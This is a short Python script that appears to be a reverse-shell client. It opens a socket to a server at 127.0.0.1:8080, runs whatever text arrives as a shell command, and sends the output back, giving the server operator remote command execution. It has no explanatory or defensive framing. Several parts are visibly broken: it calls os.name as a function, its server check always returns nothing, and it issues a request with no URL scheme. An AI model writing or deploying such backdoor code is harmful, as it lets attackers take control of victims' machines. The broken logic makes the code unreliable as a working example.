import socket
import subprocess
from os import name
import requests
from time import sleep

port = 8080
host = '127.0.0.1'

def connection_to_server():
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    while True:
        data = s.recv(1024).decode()
        if data:
            output = subprocess.check_output(data, shell=True).decode()
            s.sendall(output.encode())
        
        data1 = s.recv(1025).decode()
        if data1:
            output = name().decode()
            s.sendall(output.encode())

def check_server(output):
   output = requests.get(host)
   
while True:
      if check_server(404 or 400):
       print("offline")
       sleep(1000)
      else:
         if __name__ =='__main__':
            connection_to_server()
      



